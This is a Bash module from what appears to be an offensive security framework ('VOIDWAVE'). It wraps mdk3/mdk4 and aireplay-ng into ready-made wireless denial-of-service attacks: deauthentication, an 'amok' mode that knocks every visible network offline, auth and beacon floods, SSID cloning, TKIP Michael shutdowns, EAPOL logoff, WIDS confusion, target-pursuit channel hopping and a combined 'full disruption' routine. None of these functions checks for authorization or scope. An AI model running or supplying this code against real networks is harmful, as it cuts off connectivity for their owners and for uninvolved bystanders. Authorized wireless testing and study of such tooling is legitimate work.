#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# DoS Attacks: Wireless denial of service attacks (mdk3/mdk4, aireplay-ng)
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_DOS_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_DOS_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

#═══════════════════════════════════════════════════════════════════════════════
# DOS CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Default settings
declare -g DOS_DEAUTH_RATE="${DOS_DEAUTH_RATE:-50}"
declare -g DOS_BEACON_RATE="${DOS_BEACON_RATE:-50}"
declare -g DOS_AUTH_RATE="${DOS_AUTH_RATE:-100}"
declare -g DOS_PURSUIT_SCAN_INTERVAL="${DOS_PURSUIT_SCAN_INTERVAL:-30}"
declare -g DOS_PREFERRED_TOOL="${DOS_PREFERRED_TOOL:-auto}"  # auto, mdk4, mdk3, aireplay

# Attack state
declare -g _DOS_ATTACK_PID=""
declare -g _DOS_ATTACK_TYPE=""
declare -g _DOS_MONITOR_PID=""

# MDK modes
declare -gA MDK_MODES=(
    [deauth]="d"
    [auth]="a"
    [beacon]="b"
    [probe]="p"
    [disassoc]="D"
    [tkip]="m"
    [eapol]="e"
    [wids]="w"
    [fakeap]="f"
)

#═══════════════════════════════════════════════════════════════════════════════
# TOOL DETECTION
#═══════════════════════════════════════════════════════════════════════════════

# Get best available DoS tool
# Returns: mdk4, mdk3, or aireplay
dos_get_tool() {
    case "$DOS_PREFERRED_TOOL" in
        mdk4)
            if command -v mdk4 &>/dev/null; then
                echo "mdk4"; return 0
            fi
            ;;
        mdk3)
            if command -v mdk3 &>/dev/null; then
                echo "mdk3"; return 0
            fi
            ;;
        aireplay)
            if command -v aireplay-ng &>/dev/null; then
                echo "aireplay"; return 0
            fi
            ;;
        auto|*)
            # Prefer mdk4 > mdk3 > aireplay-ng
            if command -v mdk4 &>/dev/null; then
                echo "mdk4"; return 0
            elif command -v mdk3 &>/dev/null; then
                echo "mdk3"; return 0
            elif command -v aireplay-ng &>/dev/null; then
                echo "aireplay"; return 0
            fi
            ;;
    esac

    log_error "No DoS tool found (install mdk4, mdk3, or aircrack-ng)"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# DEAUTHENTICATION ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Deauth attack using mdk4/mdk3
# Args: $1 = interface, $2 = target BSSID, $3 = client (optional, all if empty)
dos_deauth_mdk() {
    local iface="$1"
    local target_bssid="$2"
    local client="${3:-}"

    local tool
    tool=$(dos_get_tool) || return 1

    local targetlist
    targetlist=$(mktemp)

    if [[ -n "$client" ]]; then
        echo "$target_bssid $client" >> "$targetlist"
    else
        echo "$target_bssid" >> "$targetlist"
    fi

    log_info "Starting deauth attack via $tool on $target_bssid"
    [[ -n "$client" ]] && log_info "Target client: $client"

    dos_stop  # Stop any existing attack

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" d -b "$targetlist" -c "$DOS_DEAUTH_RATE" &>/dev/null &
    else
        mdk3 "$iface" d -b "$targetlist" &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="deauth"

    log_debug "Attack started (PID: $_DOS_ATTACK_PID)"
    return 0
}

# Deauth attack using aireplay-ng
# Args: $1 = interface, $2 = target BSSID, $3 = client (optional)
dos_deauth_aireplay() {
    local iface="$1"
    local target_bssid="$2"
    local client="${3:-}"

    if ! command -v aireplay-ng &>/dev/null; then
        log_error "aireplay-ng not found"
        return 1
    fi

    log_info "Starting deauth attack via aireplay-ng on $target_bssid"

    dos_stop

    if [[ -n "$client" ]]; then
        aireplay-ng -0 0 -a "$target_bssid" -c "$client" --ignore-negative-one "$iface" &>/dev/null &
    else
        aireplay-ng -0 0 -a "$target_bssid" --ignore-negative-one "$iface" &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="deauth"

    log_debug "Attack started (PID: $_DOS_ATTACK_PID)"
    return 0
}

# Combined deauth - uses best available tool
# Args: $1 = interface, $2 = target BSSID, $3 = client (optional)
dos_deauth() {
    local iface="$1"
    local target_bssid="$2"
    local client="${3:-}"

    local tool
    tool=$(dos_get_tool) || return 1

    case "$tool" in
        mdk4|mdk3)
            dos_deauth_mdk "$iface" "$target_bssid" "$client"
            ;;
        aireplay)
            dos_deauth_aireplay "$iface" "$target_bssid" "$client"
            ;;
    esac
}

# Amok mode (deauth all visible networks)
# Args: $1 = interface, $2 = channel (optional, all channels if empty)
dos_amok_mode() {
    local iface="$1"
    local channel="${2:-}"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "Amok mode requires mdk3/mdk4"
        return 1
    fi

    log_warning "Starting AMOK mode - deauthing ALL visible networks!"

    dos_stop

    if [[ "$tool" == "mdk4" ]]; then
        if [[ -n "$channel" ]]; then
            mdk4 "$iface" d -c "$channel" &>/dev/null &
        else
            mdk4 "$iface" d &>/dev/null &
        fi
    else
        if [[ -n "$channel" ]]; then
            mdk3 "$iface" d -c "$channel" &>/dev/null &
        else
            mdk3 "$iface" d &>/dev/null &
        fi
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="amok"

    log_debug "Amok mode started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# AUTHENTICATION ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Auth flood attack (fake client connections)
# Args: $1 = interface, $2 = target BSSID
dos_auth_flood() {
    local iface="$1"
    local target_bssid="$2"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "Auth flood requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting auth flood on $target_bssid"

    dos_stop

    local targetlist
    targetlist=$(mktemp)
    echo "$target_bssid" >> "$targetlist"

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" a -a "$target_bssid" -m -c "$DOS_AUTH_RATE" &>/dev/null &
    else
        mdk3 "$iface" a -a "$target_bssid" -m &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="auth"

    log_debug "Auth flood started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# BEACON ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Beacon flood attack (fake APs)
# Args: $1 = interface, $2 = SSID list file (optional), $3 = channel (optional)
dos_beacon_flood() {
    local iface="$1"
    local ssid_file="${2:-}"
    local channel="${3:-}"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "Beacon flood requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting beacon flood attack"

    dos_stop

    local cmd

    if [[ "$tool" == "mdk4" ]]; then
        cmd=(mdk4 "$iface" b)
        [[ -n "$ssid_file" && -f "$ssid_file" ]] && cmd+=(-f "$ssid_file")
        [[ -n "$channel" ]] && cmd+=(-c "$channel")
        cmd+=(-s "$DOS_BEACON_RATE")
    else
        cmd=(mdk3 "$iface" b)
        [[ -n "$ssid_file" && -f "$ssid_file" ]] && cmd+=(-f "$ssid_file")
        [[ -n "$channel" ]] && cmd+=(-c "$channel")
    fi

    "${cmd[@]}" &>/dev/null &

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="beacon"

    log_debug "Beacon flood started (PID: $_DOS_ATTACK_PID)"
    return 0
}

# Beacon flood with random SSIDs
# Args: $1 = interface, $2 = count (default 50), $3 = channel (optional)
dos_beacon_random() {
    local iface="$1"
    local count="${2:-50}"
    local channel="${3:-}"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "Beacon flood requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting random beacon flood ($count SSIDs)"

    dos_stop

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" b -w n -s "$DOS_BEACON_RATE" ${channel:+-c "$channel"} &>/dev/null &
    else
        mdk3 "$iface" b -w n ${channel:+-c "$channel"} &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="beacon_random"

    log_debug "Random beacon flood started (PID: $_DOS_ATTACK_PID)"
    return 0
}

# Clone target SSID with multiple beacons
# Args: $1 = interface, $2 = target SSID, $3 = count (default 10)
dos_beacon_clone() {
    local iface="$1"
    local target_ssid="$2"
    local count="${3:-10}"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "Beacon clone requires mdk3/mdk4"
        return 1
    fi

    log_info "Cloning SSID '$target_ssid' with $count fake APs"

    dos_stop

    local ssid_file
    ssid_file=$(mktemp)

    # Create file with repeated SSID
    for ((i = 0; i < count; i++)); do
        echo "$target_ssid" >> "$ssid_file"
    done

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" b -f "$ssid_file" -s "$DOS_BEACON_RATE" &>/dev/null &
    else
        mdk3 "$iface" b -f "$ssid_file" &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="beacon_clone"

    # Clean up temp file after a delay
    (sleep 5; rm -f "$ssid_file") &

    log_debug "Beacon clone attack started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# MICHAEL (TKIP) ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# TKIP Michael attack (causes MIC failures)
# Args: $1 = interface, $2 = target BSSID
dos_tkip_michael() {
    local iface="$1"
    local target_bssid="$2"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "TKIP Michael attack requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting TKIP Michael attack on $target_bssid"
    log_info "This can cause 60-second TKIP countermeasure shutdowns"

    dos_stop

    local targetlist
    targetlist=$(mktemp)
    echo "$target_bssid" >> "$targetlist"

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" m -t "$target_bssid" &>/dev/null &
    else
        mdk3 "$iface" m -t "$target_bssid" &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="tkip"

    log_debug "TKIP attack started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# PROBE ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Probe flood attack
# Args: $1 = interface, $2 = target BSSID (optional)
dos_probe_flood() {
    local iface="$1"
    local target_bssid="${2:-}"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "Probe flood requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting probe flood attack"

    dos_stop

    if [[ "$tool" == "mdk4" ]]; then
        if [[ -n "$target_bssid" ]]; then
            mdk4 "$iface" p -b "$target_bssid" &>/dev/null &
        else
            mdk4 "$iface" p &>/dev/null &
        fi
    else
        if [[ -n "$target_bssid" ]]; then
            mdk3 "$iface" p -b "$target_bssid" &>/dev/null &
        else
            mdk3 "$iface" p &>/dev/null &
        fi
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="probe"

    log_debug "Probe flood started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# EAPOL ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# EAPOL logoff attack (force reauthentication)
# Args: $1 = interface, $2 = target BSSID
dos_eapol_logoff() {
    local iface="$1"
    local target_bssid="$2"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "EAPOL attack requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting EAPOL logoff attack on $target_bssid"

    dos_stop

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" e -t "$target_bssid" &>/dev/null &
    else
        mdk3 "$iface" e -t "$target_bssid" &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="eapol"

    log_debug "EAPOL attack started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# PURSUIT MODE (Channel Hopping DoS)
#═══════════════════════════════════════════════════════════════════════════════

# Pursuit mode - follows target AP across channel changes
# Args: $1 = interface, $2 = target BSSID
dos_pursuit_mode() {
    local iface="$1"
    local target_bssid="$2"

    log_info "Starting pursuit mode for $target_bssid"
    log_info "Following target across channel changes..."

    local last_channel=""
    local scan_interval="$DOS_PURSUIT_SCAN_INTERVAL"

    # Start monitoring in background
    (
        while true; do
            # Quick scan to find target's current channel
            local scan_output
            scan_output=$(mktemp)

            timeout 5 airodump-ng --bssid "$target_bssid" -w "$scan_output" --output-format csv "$iface" &>/dev/null

            if [[ -f "${scan_output}-01.csv" ]]; then
                local current_channel
                current_channel=$(grep "$target_bssid" "${scan_output}-01.csv" 2>/dev/null | cut -d',' -f4 | tr -d ' ')

                if [[ -n "$current_channel" && "$current_channel" != "$last_channel" ]]; then
                    log_info "Target moved to channel $current_channel"
                    last_channel="$current_channel"

                    # Restart attack on new channel
                    dos_stop
                    iwconfig "$iface" channel "$current_channel" 2>/dev/null
                    dos_deauth "$iface" "$target_bssid"
                fi

                rm -f "${scan_output}"* 2>/dev/null
            fi

            sleep "$scan_interval"
        done
    ) &

    _DOS_MONITOR_PID=$!
    log_debug "Pursuit mode monitor started (PID: $_DOS_MONITOR_PID)"
}

#═══════════════════════════════════════════════════════════════════════════════
# ATTACK CONTROL
#═══════════════════════════════════════════════════════════════════════════════

# Stop current DoS attack
dos_stop() {
    if [[ -n "$_DOS_ATTACK_PID" ]]; then
        kill "$_DOS_ATTACK_PID" 2>/dev/null
        wait "$_DOS_ATTACK_PID" 2>/dev/null
        log_debug "Stopped DoS attack (was: $_DOS_ATTACK_TYPE)"
        _DOS_ATTACK_PID=""
        _DOS_ATTACK_TYPE=""
    fi

    if [[ -n "$_DOS_MONITOR_PID" ]]; then
        kill "$_DOS_MONITOR_PID" 2>/dev/null
        wait "$_DOS_MONITOR_PID" 2>/dev/null
        _DOS_MONITOR_PID=""
    fi

    # Kill any remaining mdk/aireplay processes
    pkill -f "mdk4.*$1" 2>/dev/null
    pkill -f "mdk3.*$1" 2>/dev/null
    pkill -f "aireplay-ng.*-0.*$1" 2>/dev/null
}

# Check if attack is running
# Returns: 0 if running, 1 if not
dos_is_running() {
    [[ -n "$_DOS_ATTACK_PID" ]] && kill -0 "$_DOS_ATTACK_PID" 2>/dev/null
}

# Get current attack status
dos_status() {
    if dos_is_running; then
        echo "running:$_DOS_ATTACK_TYPE:$_DOS_ATTACK_PID"
    else
        echo "stopped"
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# COMBINED ATTACKS
#═══════════════════════════════════════════════════════════════════════════════

# Full network disruption (deauth + auth flood + beacon clone)
# Args: $1 = main interface, $2 = second interface (optional), $3 = target BSSID, $4 = SSID
dos_full_disruption() {
    local iface1="$1"
    local iface2="${2:-}"
    local target_bssid="$3"
    local ssid="$4"

    log_warning "Starting full network disruption on $ssid"

    # Primary: Deauth attack
    dos_deauth "$iface1" "$target_bssid"

    # If second interface available, add beacon confusion
    if [[ -n "$iface2" ]]; then
        log_info "Adding beacon clone attack on second interface"
        dos_beacon_clone "$iface2" "$ssid" 20
    fi

    log_success "Full disruption attack running"
}

#═══════════════════════════════════════════════════════════════════════════════
# WIDS CONFUSION
#═══════════════════════════════════════════════════════════════════════════════

# WIDS/WIPS confusion attack
# Args: $1 = interface
dos_wids_confusion() {
    local iface="$1"

    local tool
    tool=$(dos_get_tool) || return 1

    if [[ "$tool" != "mdk4" && "$tool" != "mdk3" ]]; then
        log_error "WIDS confusion requires mdk3/mdk4"
        return 1
    fi

    log_info "Starting WIDS/WIPS confusion attack"

    dos_stop

    if [[ "$tool" == "mdk4" ]]; then
        mdk4 "$iface" w &>/dev/null &
    else
        mdk3 "$iface" w &>/dev/null &
    fi

    _DOS_ATTACK_PID=$!
    _DOS_ATTACK_TYPE="wids"

    log_debug "WIDS confusion started (PID: $_DOS_ATTACK_PID)"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

# Cleanup function
dos_cleanup() {
    dos_stop

    # Clean temp files
    rm -f /tmp/dos_*.txt 2>/dev/null
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup dos_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f dos_get_tool
export -f dos_deauth_mdk dos_deauth_aireplay dos_deauth dos_amok_mode
export -f dos_auth_flood
export -f dos_beacon_flood dos_beacon_random dos_beacon_clone
export -f dos_tkip_michael
export -f dos_probe_flood
export -f dos_eapol_logoff
export -f dos_pursuit_mode
export -f dos_stop dos_is_running dos_status
export -f dos_full_disruption dos_wids_confusion
export -f dos_cleanup
